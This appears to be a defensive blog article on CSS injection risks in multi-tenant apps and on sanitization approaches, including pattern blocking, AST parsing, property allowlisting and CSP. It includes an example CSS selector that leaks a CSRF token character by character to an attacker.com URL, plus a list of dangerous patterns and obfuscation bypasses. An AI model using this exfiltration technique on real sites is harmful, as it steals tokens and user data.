---
title: Understanding CSS Injection and Sanitization in Multi-Tenant Apps
excerpt: CSS is more dangerous than it looks, learn the threats and how to protect against them.
---

Multi-tenant applications often let customers customize their branding with custom CSS. This creates significant customization capabilities, but also opens security vectors that many developers underestimate. CSS is not just about colors and fonts.

## The Problem with User-Provided CSS

CSS has capabilities that extend far beyond visual styling. When accepting CSS from untrusted sources, the attack surface includes data exfiltration, resource loading, and in older browsers, code execution.

### Data Exfiltration Through URL Loading

CSS can load external URLs through properties like `background-image`, `list-style-image`, and the `url()` function. This enables attackers to detect which elements exist on a page, what values form fields contain, or whether a user is logged in.

```css
input[name="csrf"][value^="a"] {
	background: url("https://attacker.com/log?char=a");
}
```

This technique creates many selectors, each checking if a form field's value starts with a specific character. When the browser matches a selector, it loads the corresponding URL, leaking the character to the attacker's server. Repeating this process extracts entire values character by character.

### External Stylesheet Loading

The `@import` rule loads external stylesheets, bypassing any inline CSS sanitization. An attacker could import a stylesheet from their server containing any malicious rules blocked in the original input.

## Why Threat Models Vary

The appropriate sanitization approach depends heavily on the context.

**Low risk scenarios** involve trusted users like internal employees or paying customers with contractual obligations. Attackers would need to compromise a trusted account first.

**Medium risk scenarios** involve semi-trusted users like customers of your customers. They have some accountability but less oversight.

**High risk scenarios** involve anonymous or low-trust users, or any situation where a malicious actor could sign up and inject CSS that affects other users.

The risk also depends on what data is exposed. A branding page showing only the customer's own content has lower risk than a shared dashboard where CSS injection could affect other tenants.

## Pattern Blocking

The simplest approach identifies dangerous patterns and removes or rejects them. This involves creating regex patterns for known attack vectors: `javascript:`, `expression()`, `@import`, `-moz-binding`, `behavior:`, and external URLs.

This approach is fast and simple to implement, handling most common attacks. However, it can miss novel obfuscation techniques. An attacker might try `exp/*comment*/ression()` or `java\nscript:` to bypass naive pattern matching.

Pattern blocking works well for low risk scenarios or as a first line of defense combined with other approaches.

## AST Parsing and Validation

A more robust approach parses CSS into an Abstract Syntax Tree and validates each node. Libraries like `css-tree` provide fast CSS parsers that normalize the input before analysis.

The advantage here is handling obfuscation because the parser normalizes CSS before analysis. This allows inspecting the actual structure rather than just text patterns. The trade-off is additional complexity in implementation and a need to understand CSS AST structure.

AST parsing suits medium risk scenarios where stronger security is needed but flexibility should be preserved.

## Property Allowlisting

The most secure approach only allows properties explicitly trusted. Rather than blocking dangerous patterns, this defines exactly what is permitted: `color`, `background-color`, `font-family`, `margin`, `padding`, and so on.

This is future-proof against new attack vectors since unknown properties are automatically blocked. The cost is restrictiveness. Users can only use what has been approved, limiting creative customization.

Allowlisting is appropriate for high risk scenarios where any tenant might be malicious and maximum protection is required.

## Why Security and Flexibility Trade Off

Every sanitization decision involves trade-offs between security and usability.

Blocking external URLs prevents data exfiltration but also prevents users from loading web fonts or background images from CDNs. Providing an approved list of domains or hosting assets yourself mitigates this.

Removing @import prevents external stylesheet loading but breaks workflows where users maintain CSS in separate files. Alternative mechanisms for stylesheet imports may be necessary.

Allowlisting properties is secure but frustrating when users cannot use `box-shadow` or `transform` because they were omitted from the list. Maintaining the list requires ongoing effort.

The choice between silently removing dangerous CSS versus rejecting it with an error message affects user experience. Silent removal is safer but confusing when styles do not work. Rejection with clear error messages helps users understand the limits but requires better error messaging infrastructure.

## Value Validation Matters

Even safe properties can have dangerous values. The `font-family` property normally takes font names, but could include `url()` in some contexts. The `background` shorthand can include `url()` references.

For high security scenarios, validating not just property names but also property values is necessary. Checking that colors are actual color values, sizes are numeric with units, and no URLs appear where they should not catches attacks that use valid properties with malicious values.

This adds implementation complexity but widens the security coverage.

## Defense in Depth

CSS sanitization should work alongside other security measures.

Content Security Policy provides a second line of defense. The `style-src` directive controls where styles can come from. Even if sanitization misses something, CSP can block external resource loading.

Input validation at submission time catches problems early. Users receive immediate feedback rather than discovering issues later.

Output encoding ensures CSS does not break out of its context. If CSS is injected into an HTML attribute, it must not escape the attribute.

Monitoring and logging helps detect attacks. Logging when sanitization removes content and watching for patterns that might indicate probing provides visibility into attempted exploitation.

## When Approaches Apply

Pattern blocking suits low risk scenarios or as the first layer in a multi-layer approach. It is fast and catches obvious attacks.

AST parsing suits medium risk scenarios where reliable detection of obfuscated attacks is needed but flexibility should be preserved. It handles edge cases that regex misses.

Allowlisting suits high risk scenarios like multi-tenant SaaS where any tenant could be malicious, or when protecting high-value targets like banking or healthcare applications.

Combining approaches provides defense in depth. Starting with pattern blocking for obvious attacks, adding AST parsing for structural validation, and applying allowlisting for the strictest scenarios covers more attack surface.

## Conclusion

CSS has capabilities that extend beyond visual styling. It can load resources, interact with form elements, and in legacy contexts, execute code. When allowing user-provided CSS, the attack surface includes capabilities that exceed visual customization.

The appropriate sanitization strategy depends on the threat model. Low risk scenarios might only need pattern blocking. High risk scenarios require allowlisting with value validation. Most applications fall somewhere between, combining multiple approaches for defense in depth.

User-provided CSS requires the same caution as any untrusted input. The visual nature of CSS makes it easy to underestimate, but the security implications are real.
